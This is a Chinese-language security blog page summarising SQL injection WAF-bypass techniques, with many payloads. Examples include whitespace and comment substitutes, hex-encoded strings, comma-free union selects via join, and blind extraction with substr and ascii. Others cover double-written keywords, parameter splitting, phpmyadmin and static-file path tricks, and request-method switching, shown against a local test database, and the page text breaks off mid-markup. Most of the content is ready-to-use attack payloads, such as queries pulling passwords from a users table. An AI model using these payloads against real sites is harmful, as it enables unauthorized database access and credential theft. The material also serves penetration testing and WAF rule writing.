<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png"><link rel="icon" href="/img/fluid.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="wanf3ng"><meta name="keywords" content="网络安全,晚风,wanf3ng"><meta name="description" content="前言断更了近一年，再回来还是樱花盛放的季节。期间发生了很多事，上一篇文章下面评论的妹妹已经成了女朋友:），三月也要和你一起努力 本文是对SQL注入绕过技术的总结，以后看到新姿势就加进来，不定期更新 空格绕过空格在url编码中通常为%20，如果这个字符被waf拦截时，我们可以用以下的字符来替换    字符 含义    %09 TAB键（水平）   %0a 新建一行   %0b TAB键（垂直）"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入绕过"><meta property="og:url" content="https://wanf3ng.github.io/2022/03/18/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/index.html"><meta property="og:site_name" content="wanf3ng&#39;s blog"><meta property="og:description" content="前言断更了近一年，再回来还是樱花盛放的季节。期间发生了很多事，上一篇文章下面评论的妹妹已经成了女朋友:），三月也要和你一起努力 本文是对SQL注入绕过技术的总结，以后看到新姿势就加进来，不定期更新 空格绕过空格在url编码中通常为%20，如果这个字符被waf拦截时，我们可以用以下的字符来替换    字符 含义    %09 TAB键（水平）   %0a 新建一行   %0b TAB键（垂直）"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://s2.loli.net/2022/03/24/cjDd9A36tUgk4xH.jpg"><meta property="article:published_time" content="2022-03-18T05:30:11.000Z"><meta property="article:modified_time" content="2022-05-20T06:20:40.000Z"><meta property="article:author" content="wanf3ng"><meta property="article:tag" content="sql注入"><meta property="article:tag" content="bypass"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://s2.loli.net/2022/03/24/cjDd9A36tUgk4xH.jpg"><meta name="referrer" content="no-referrer-when-downgrade"><title>SQL注入绕过 - wanf3ng&#39;s blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/custom.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"wanf3ng.github.io",root:"/",version:"1.9.5-a",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:"952845559a725a8f8506594fda37c635",google:{measurement_id:null},tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml",include_content_in_search:!0};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>if(!Fluid.ctx.dnt){var _hmt=_hmt||[];!function(){var t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?952845559a725a8f8506594fda37c635";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()}</script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=",(function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","")}))</script><meta name="generator" content="Hexo 6.3.0"><link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>晚风</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span>首页</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span>归档</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span>分类</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span>标签</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span>关于</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/default.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="SQL注入绕过"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> wanf3ng </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-03-18 13:30" pubdate>2022年3月18日 下午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 11k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 94 分钟 </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">SQL注入绕过</h1><div class="markdown-body"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>断更了近一年，再回来还是樱花盛放的季节。期间发生了很多事，上一篇文章下面评论的妹妹已经成了女朋友:），三月也要和你一起努力</p><p>本文是对SQL注入绕过技术的总结，以后看到新姿势就加进来，不定期更新</p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>空格在url编码中通常为%20，如果这个字符被waf拦截时，我们可以用以下的字符来替换</p><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td>%09</td><td>TAB键（水平）</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0b</td><td>TAB键（垂直）</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>回车键</td></tr><tr><td>%a0</td><td>空格</td></tr><tr><td>%00</td><td>终止符</td></tr><tr><td>&#x2F;**&#x2F;</td><td>mysql注释符</td></tr><tr><td>&#x2F;*!*&#x2F;</td><td>mysql注释符+检测版本的语法</td></tr></tbody></table><p>特别注意：</p><ol><li>%00会截断语句，有时候不可直接作为空格的替换字符，如果直接使用会造成sql语句报错</li><li>mysql中有个特性，一般情况下<code>/*!*/</code>是用于检测mysql版本，也就是感叹号后面要加数据库版本号。如果高于这个版本，就执行后面的语句。例如下面的语句表示数据库版本高5.00.09才会执行</li></ol><blockquote><p>&#x2F;*!50009 select * from test*&#x2F;</p></blockquote><p>另外通常感叹号后面加的是数字，如果是其他字符将会报错。但有例外，如果加的是sql关键字比如union、select、where等，那么也能正常执行。</p><p><img src="/image-20220318193252121.png" srcset="/img/loading.gif" lazyload alt="image-20220318193252121"></p><p><img src="/image-20220318193110620.png" srcset="/img/loading.gif" lazyload alt="image-20220318193110620"></p><p>以下还有师傅总结的各种数据库中的空白字符</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SQLite3</span> <span class="hljs-number">0</span>A <span class="hljs-number">0</span>D <span class="hljs-number">0</span>C <span class="hljs-number">09</span> <span class="hljs-number">20</span> <br><span class="hljs-attribute">MySQL5</span> <span class="hljs-number">09</span> <span class="hljs-number">0</span>A <span class="hljs-number">0</span>B <span class="hljs-number">0</span>C <span class="hljs-number">0</span>D A0 <span class="hljs-number">20</span> <br><span class="hljs-attribute">PosgresSQL</span> <span class="hljs-number">0</span>A <span class="hljs-number">0</span>D <span class="hljs-number">0</span>C <span class="hljs-number">09</span> <span class="hljs-number">20</span> <br><span class="hljs-attribute">Oracle</span> <span class="hljs-number">11</span>g <span class="hljs-number">00</span> <span class="hljs-number">0</span>A <span class="hljs-number">0</span>D <span class="hljs-number">0</span>C <span class="hljs-number">09</span> <span class="hljs-number">20</span> <br><span class="hljs-attribute">MSSQL</span> <span class="hljs-number">01</span>,<span class="hljs-number">02</span>,<span class="hljs-number">03</span>,<span class="hljs-number">04</span>,<span class="hljs-number">05</span>,<span class="hljs-number">06</span>,<span class="hljs-number">07</span>,<span class="hljs-number">08</span>,<span class="hljs-number">09</span>,<span class="hljs-number">0</span>A,<span class="hljs-number">0</span>B,<span class="hljs-number">0</span>C,<span class="hljs-number">0</span>D,<span class="hljs-number">0</span>E,<span class="hljs-number">0</span>F,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">1</span>A,<span class="hljs-number">1</span>B,<span class="hljs-number">1</span>C,<span class="hljs-number">1</span>D,<span class="hljs-number">1</span>E,<span class="hljs-number">1</span>F,<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><h3 id="浮点数绕过"><a href="#浮点数绕过" class="headerlink" title="浮点数绕过"></a>浮点数绕过</h3><p>如果注入点是整型，那么将其改为浮点数也能绕过部分waf，如将8改为8E0或8.0</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>将字母改为大小写混合的形式，如</p><blockquote><p>select * from users where id&#x3D;1 UnIon SelEct 1,2,3–+</p></blockquote><h3 id="NULL值绕过"><a href="#NULL值绕过" class="headerlink" title="NULL值绕过"></a>NULL值绕过</h3><p>在mysql中“\N”代表null</p><p><img src="/image-20220318201947600.png" srcset="/img/loading.gif" lazyload alt="image-20220318201947600"></p><blockquote><p>select * from users where id&#x3D;\Nunion select 1,2,\N</p></blockquote><p><img src="/image-20220318202328396.png" srcset="/img/loading.gif" lazyload alt="image-20220318202328396"></p><p>注意：\N后面的空格可加可不加，语法上都可行，不加可以绕过部分waf</p><h3 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h3><p>如果waf过滤了单引号、双引号，那么可以将值转为十六进制再进行查询，如’admin’的十六进制为’61646D696E’，那么我们直接把’admin’替换为0x61646D696E就好，整个payload就不需要引号了。需要注意的是只有注入点是整型才可以，如果注入点是字符型则没法闭合引号，会导致语句报错。</p><p><img src="/image-20220319121831699.png" srcset="/img/loading.gif" lazyload alt="image-20220319121831699"></p><blockquote><p>select * from users where id&#x3D;-1 union select 1,2,(select password from users where username&#x3D;’admin’)–+</p></blockquote><blockquote><p>select * from users where id&#x3D;-1 union select 1,2,(select password from users where username&#x3D;0x61646D696E)–+</p></blockquote><h3 id="添加库名表名-跨库查询"><a href="#添加库名表名-跨库查询" class="headerlink" title="添加库名表名&amp;&amp;跨库查询"></a>添加库名表名&amp;&amp;跨库查询</h3><blockquote><p>select password from users</p></blockquote><blockquote><p>select users.password from security.users</p></blockquote><p>假设我们要查询的数据库为security，表为users，以上两条语句的查询结果是一样的。下面加了库名表名的语句就可以绕过部分waf</p><h3 id="打破常见关键字组合绕过"><a href="#打破常见关键字组合绕过" class="headerlink" title="打破常见关键字组合绕过"></a>打破常见关键字组合绕过</h3><p>“union select”这两个关键字在查询时通常都会连在一起使用，waf规则编写者在带有这种惯性思维编写规则时，会将带有这一整个组合的字符串一起过滤，这也会给我们可乘之机。比如在这两个关键字中再加上一个关键字，但不改变语句的查询结果，有这种关键字吗？有，比如“distinct”去重复关键字，“all”查询全部，以及“distinct”的同义词“distinctrow”。或者直接在这之间加入换行符或者注释</p><blockquote><p>-1’ union distinct select password from users–+</p><p>-1’ union all select password from users–+</p><p>-1’ union%0a&#x2F;*任意字符。。。*&#x2F;select password from users–+</p></blockquote><h3 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h3><p>查询语句在表名上，可以加上反引号，也可以不加反引号，都能正常执行。有时候加上反引号可以绕过</p><blockquote><p>-1’ union select password from `users`–+</p></blockquote><h3 id="脚本语言特性绕过"><a href="#脚本语言特性绕过" class="headerlink" title="脚本语言特性绕过"></a>脚本语言特性绕过</h3><p>PHP中同一个变量最后出现的值会覆盖前面的赋值，比如</p><blockquote><p>id&#x3D;1&amp;id&#x3D;2</p></blockquote><p>此时在php中id取值为2，我们可以利用这个特性来绕过waf，需要注意的是不同的脚本语言配合不同的中间件有不同的特性</p><blockquote><p>id&#x3D;1%00&amp;id&#x3D;2 union select 1,2,3–</p></blockquote><p>%00是截断字符，有的waf匹配到第一个%00时，会终止匹配，从而让后面的语句进入执行，最终php处理的语句为<code>id=2 union select 1,2,3--</code>从而造成了注入。</p><p>其他语言特性</p><p><img src="/image-20220321102648180.png" srcset="/img/loading.gif" lazyload alt="image-20220321102648180"></p><h3 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h3><p>在常规的显式注入中，我们会用union select来让想要的信息直接显示在页面上。但有些waf会过滤逗号，所以我们需要找一种不需要逗号的注入方式。对于显式查询和盲注有不同的绕过绕过方式，join连接可以用于显式注入，而substr、mid、like这类字符对比类的方法可以用于盲注的场景。</p><h4 id="join连接"><a href="#join连接" class="headerlink" title="join连接"></a>join连接</h4><p>先说存在显式注入的情况。在常规的显式注入时，我们会用联合查询也就是union select来把数据显示在页面上</p><blockquote><p>id&#x3D;1 union select 1,database(),user()–</p></blockquote><p>问题是这会有逗号，用join就可以在没有逗号的情况下使用联合查询显式爆数据。用下面的语句可以达到和上面语句一样的效果</p><blockquote><p>id&#x3D;1 union select (select 1)a join (select database())b join (select user())c</p></blockquote><p><img src="/image-20220321124005981.png" srcset="/img/loading.gif" lazyload alt="image-20220321124005981"></p><p>这里我们让id&#x3D;-1确保没有对应的信息，这样才能显示后面我们想要的数据。前面的users表有三个字段，所以这里联合查询的时候第一个字段显示1，第二，三个字段分别显示当前的数据库名和用户名。另外就是由于join连接后是表，所以在union select后是从联合表中查询信息，不能像之前那样直接<code>union select 1,2,database()</code>来获取信息。</p><h4 id="substr截取字符"><a href="#substr截取字符" class="headerlink" title="substr截取字符"></a>substr截取字符</h4><p>在常规的盲注中获取当前使用的数据库名，我们会用以下语句来对比数据库的第一位字符</p><blockquote><p>id&#x3D;1 and ‘s’&#x3D;(select(substr(database(),1,1)))–</p></blockquote><p><img src="/image-20220321112852964.png" srcset="/img/loading.gif" lazyload alt="image-20220321112852964"></p><p>我们来关注一下语句的后半段，substr这个函数的第一个参数是需要截取的字符，这个不用多说。第二个参数是从第几位开始截取，第三个参数是截取的步长，也就是截取几位字符。也可以写作<code>substr(database() from 1 for 1)</code>这种形式，从而把逗号去除。再看前面的’s’可以用十六进制来表示，字母s对应的十六进制为0x73，所以上面的语句可以变为</p><p><img src="/image-20220321113509192.png" srcset="/img/loading.gif" lazyload alt="image-20220321113509192"></p><blockquote><p>id&#x3D;1 and 0x73&#x3D;(select(substr(database()from 1 for 1)))–</p></blockquote><h4 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h4><p>除了substr这个函数可以用来截取字符串绕过逗号，也可以使用mid来代替substr，用法完全相同，原理同上。</p><blockquote><p>id&#x3D;1 and 0x73&#x3D;(select(mid(database()from 1 for 1)))–</p></blockquote><h4 id="like模糊查询"><a href="#like模糊查询" class="headerlink" title="like模糊查询"></a>like模糊查询</h4><p>用like模糊查询也是一种用于盲注的字符对比类的注入方式，模糊查询匹配成功返回1，否则返回0。我们可以一个字符一个字符来遍历得到结果。这种方式也不需要逗号。</p><p><img src="/image-20220321154245371.png" srcset="/img/loading.gif" lazyload alt="image-20220321154245371"></p><h4 id="limit-offset绕过"><a href="#limit-offset绕过" class="headerlink" title="limit offset绕过"></a>limit offset绕过</h4><p>在遍历数据时，我们会用limit去选取哪一行或者哪几行的数据。limit如果只给一个参数时代表rows，即需要的行数。如果给了两个参数，那么第一个参数代表offset，即从第几行开始选取，第二个参数代表rows。下面的语句表示从2开始选取一条数据</p><blockquote><p>select * from users limit 2,1;</p></blockquote><p>如果waf过滤了逗号，也可以写作<code>limit [rows] offset [offset]</code>的形式</p><blockquote><p>select * from users limit 1 offset 2;</p></blockquote><p><img src="/image-20220321180620271.png" srcset="/img/loading.gif" lazyload alt="image-20220321180620271"></p><h3 id="运算符绕过"><a href="#运算符绕过" class="headerlink" title="运算符绕过"></a>运算符绕过</h3><p>这四个关键字是手工注入中判断是否存在注入点最常用的方式，主流waf都会对<code>id=1 and 1=1</code>类似这些语句做拦截。其实这四个关键字可以用逻辑运算符号来替代</p><table><thead><tr><th>逻辑运算符</th><th>对应符号</th><th>使用形式</th></tr></thead><tbody><tr><td>and</td><td>&amp;&amp;</td><td>id&#x3D;1 &amp;&amp; 1&#x3D;1</td></tr><tr><td>or</td><td>||</td><td>id&#x3D;1 || 1&#x3D;1</td></tr><tr><td>not</td><td>!</td><td>id&#x3D;1 &amp;&amp; 1&#x3D;(!(!1))</td></tr><tr><td>xor</td><td>^</td><td>id&#x3D;1 &amp;&amp; 1^1</td></tr></tbody></table><p>关于not还有一种姿势，<code>(-1 not in (1))</code>这个语句恒等于1，而<code>(-1 not in (-1))</code>这个语句恒等于0，所以我们也可以用这个来代替前面的<code>1=1</code>的判断</p><blockquote><p>select * from users where id&#x3D;-1 not in (1)</p><p>select * from users where id&#x3D;-1 not in (-1)</p></blockquote><p>还有以下6种位运算符</p><table><thead><tr><th>位运算符</th><th>说明</th><th>使用形式</th></tr></thead><tbody><tr><td>|</td><td>位或</td><td>a|b</td></tr><tr><td>&amp;</td><td>位与</td><td>a&amp;b</td></tr><tr><td>^</td><td>位异或</td><td>a^b</td></tr><tr><td>~</td><td>位取反</td><td>~a</td></tr><tr><td>&lt;&lt;</td><td>位左移</td><td>a&lt;&lt;b</td></tr><tr><td>&gt;&gt;</td><td>位右移</td><td>a&gt;&gt;b</td></tr></tbody></table><p>也可以用运算符来对手工注入的语句做一些变换</p><blockquote><p>id&#x3D;1 &amp;&amp; 2&#x3D;1+1</p></blockquote><h3 id="ascii字符对比绕过"><a href="#ascii字符对比绕过" class="headerlink" title="ascii字符对比绕过"></a>ascii字符对比绕过</h3><p>有些waf对union select拦截的话，我们就没办法使用显式注入了。不过可以用盲注中的字符对比法来爆数据。</p><blockquote><p>select * from users where id&#x3D;1 and substr(database(),1,1)&#x3D;’s’</p><p>select * from users where id&#x3D;1 and ascii(substr(database(),1,1))&#x3D;115</p></blockquote><p>在做判断时也可以构造恒成立的语句，比如字母s的ascii就是115，这也是一种<code>1=1</code>的变体</p><blockquote><p>select * from users where id&#x3D;1 and ascii(substr(‘s’,1,1))&#x3D;115</p></blockquote><h3 id="等号绕过"><a href="#等号绕过" class="headerlink" title="等号绕过"></a>等号绕过</h3><p>如果waf对等号&#x3D;拦截，可以用大于号&gt;、小于号&lt;、like、rlike模糊查询以及正则查询regexp来绕过</p><blockquote><p>select * from users where id&#x3D;1 and ascii(substr(database(),1,1))&gt;114</p></blockquote><p>值得一提的是，用等号跑数据需要遍历每个字母，但用大于号和小于号可以用二分法查询，从而减少查询次数，加快查询速度</p><blockquote><p>select * from users where id&#x3D;1 and substr(database(),1,1)like ‘s%’</p></blockquote><p><img src="/image-20220322154113759.png" srcset="/img/loading.gif" lazyload alt="image-20220322154113759"></p><p>顺便说一下like和rlike的区别，like就是模糊查询。rlike是REGEXP_LIKE()的同义词，也是regexp的同义词。根据正则来匹配。另外他们都不区分大小写。</p><p><img src="/image-20220322155642689.png" srcset="/img/loading.gif" lazyload alt="image-20220322155642689"></p><blockquote><p>select * from users where id&#x3D;1 and substr(database(),1,1) regexp ‘^s’;</p></blockquote><p><img src="/image-20220322154315774.png" srcset="/img/loading.gif" lazyload alt="image-20220322154315774"></p><p>等号也可以用in和between来代替：</p><p><img src="/image-20220329195245538.png" srcset="/img/loading.gif" lazyload alt="image-20220329195245538"></p><p><img src="/image-20220329195509246.png" srcset="/img/loading.gif" lazyload alt="image-20220329195509246"></p><h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><p>有的防御脚本对特定关键字只过滤一次，如union、select等，那我们就可以双写关键字，使过滤一次以后的语句能正常执行</p><blockquote><p>id&#x3D;1 u<strong>union</strong>nion sele<strong>select</strong>ct 1,2,3–</p></blockquote><p>该语句被过滤一次关键字后（粗体）就变成了正常的注入语句，从而绕过了防御脚本</p><blockquote><p>id&#x3D;1 union select 1,2,3–</p></blockquote><h3 id="多参数拆分绕过"><a href="#多参数拆分绕过" class="headerlink" title="多参数拆分绕过"></a>多参数拆分绕过</h3><p>首先来看一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where id=&#x27;<span class="hljs-subst">$id</span>&#x27; and username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查询的语句是：&quot;</span>.<span class="hljs-variable">$sql</span>;<br></code></pre></td></tr></table></figure><p>有两个参数被拼接在了同一条sql查询语句中，假设waf会对每个提交上来的参数拦截其中的“union select”，该如何绕过？此时可以将“union select”拆分在不同的参数中，payload如下</p><blockquote><p>1’ union&#x2F;*&amp;username&#x3D;admin*&#x2F;select 1,2,3–+</p></blockquote><p><img src="/image-20220323184949603.png" srcset="/img/loading.gif" lazyload alt="image-20220323184949603"></p><p>可以看到username这个参数的直接被注释掉，为了看的更清晰，去除注释后的语句就变成了</p><blockquote><p>select * from users where id&#x3D;’1’ union select 1,2,3–</p></blockquote><p>就变成了一个非常普通的union select注入。小总结一下多参数拆分注入的要点是：<strong>同一条sql查询语句中存在两个或以上的可控参数</strong></p><h3 id="生僻函数绕过"><a href="#生僻函数绕过" class="headerlink" title="生僻函数绕过"></a>生僻函数绕过</h3><p>updatexml()函数经常用于报错注入中，所以waf也会对这个函数进行拦截。我们可以在mysql文档中寻找一些生僻的函数，来达到同样的效果，比如polygon()</p><blockquote><p>select polygon((select * from (select * from (select @@version) f) x));</p></blockquote><p><img src="/image-20220323185840131.png" srcset="/img/loading.gif" lazyload alt="image-20220323185840131"></p><p>还有其他的一些等价函数，如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">hex</span><span class="hljs-params">()</span></span>、<span class="hljs-built_in">bin</span>() ==&gt; <span class="hljs-built_in">ascii</span>()<br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">()</span></span> ==&gt;<span class="hljs-built_in">benchmark</span>() <br><span class="hljs-function"><span class="hljs-title">concat_ws</span><span class="hljs-params">()</span></span>==&gt;<span class="hljs-built_in">group_concat</span>() <br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">()</span></span>、<span class="hljs-built_in">substr</span>() ==&gt; <span class="hljs-built_in">substring</span>()<br>@@user ==&gt; <span class="hljs-built_in">user</span>() <br>@@datadir ==&gt; <span class="hljs-built_in">datadir</span>()<br></code></pre></td></tr></table></figure><h3 id="信任白名单"><a href="#信任白名单" class="headerlink" title="信任白名单"></a>信任白名单</h3><p>像phpmyadmin这些web端的mysql管理软件，会有大量的sql语句拼接在url中。有些waf本意是为了防止对这些管理软件的url拦截而自带文件白名单，如果请求的是白名单中的文件名，sql语句就直接放行。</p><p>白名单通常有：<code>/admin</code>，<code>/phpmyadmin</code>，<code>/admin.php</code></p><p>可以随便赋值给一个参数就行，只要包含在url就可以</p><blockquote><p><a target="_blank" rel="noopener" href="http://localhost/sqli.php?aaa=/phpmyadmin&id=-1">http://localhost/sqli.php?aaa=/phpmyadmin&amp;id=-1</a>‘ and 1&#x3D;1–+</p></blockquote><h3 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h3><p>出了白名单文件目录绕过外， 有些waf也不会对静态文件后的参数做检查，静态文件如图片jpg，png，gif，svg，样式文件css，脚本文件js，字体文件woff，ttf，利用方式也是加在url当中即可</p><blockquote><p><a target="_blank" rel="noopener" href="http://localhost/sqli.php?aaa=/1.css&id=-1">http://localhost/sqli.php?aaa=/1.css&amp;id=-1</a>‘ and 1&#x3D;1–+</p><p><a target="_blank" rel="noopener" href="http://localhost/sqli.php?/1.jpg&id=-1">http://localhost/sqli.php?/1.jpg&amp;id=-1</a>‘ and 1&#x3D;1–+</p></blockquote><h3 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h3><p>order by常用于手工注入时判断表中字段的个数，order by被拦截时可以用@符号绕过，@在mysql中是取变量的含义</p><blockquote><p>select * from users where id&#x3D;1 union select @a,@b,@c–+</p></blockquote><p>可以看到如果变量个数与字段数不相等则会报错</p><p><img src="/image-20220324184545037.png" srcset="/img/loading.gif" lazyload alt="image-20220324184545037"></p><p>再简单些也可以不输变量名，只用@符号，并且不用union select联合查询，用into赋值语句</p><p><img src="/image-20220324184701002.png" srcset="/img/loading.gif" lazyload alt="image-20220324184701002"></p><p><img src="/image-20220324184931517.png" srcset="/img/loading.gif" lazyload alt="image-20220324184931517"></p><h3 id="改变请求方式绕过"><a href="#改变请求方式绕过" class="headerlink" title="改变请求方式绕过"></a>改变请求方式绕过</h3><p>所谓的改变请求方式就是原本是get请求，可以变成用post去请求；原本是post的请求可以变成用get去请求。有几率绕过waf。具体原理我们先举个例子，首先我们都知道，如果是post请求，服务器会从请求体body中取参，而如果是get请求，服务器会从url中取参。所以waf在接收到post请求时会检测请求体body里的参数，接收到get请求时会检测url中的参数。假设服务端要用get方式接受一个id参数，那么服务端的语句一定是<code>$id=$_GET[&#39;id&#39;];</code>。那么如果我们用post给这个接口发起请求，waf检测到这是个post请求就会去检测请求体中的参数，但实际上服务端脚本接受到的是url中的参数，我们就可以在url中的参数中sql注入。</p><p><img src="/image-20220325121946047.png" srcset="/img/loading.gif" lazyload alt="image-20220325121946047"></p><p>右下角是服务器的代码，接受一个get请求的id参数。我们用post请求服务器照样可以正常接收到get参数，但waf可能就会认为这是个post请求从而去检查post请求体中的参数，造成了绕过。在实际应用中也可以试试put等请求方式</p><h3 id="application-json-或-text-xml-绕过"><a href="#application-json-或-text-xml-绕过" class="headerlink" title="application&#x2F;json 或 text&#x2F;xml 绕过"></a>application&#x2F;json 或 text&#x2F;xml 绕过</h3><p>有些waf对于json或xml中的数据不会做检查，从而造成了绕过。注意请求头中的<code>Content-Type</code>要设置为application&#x2F;json或text&#x2F;xml，并且后端程序支持接受这类形式的传参。</p><h3 id="脏数据溢出绕过"><a href="#脏数据溢出绕过" class="headerlink" 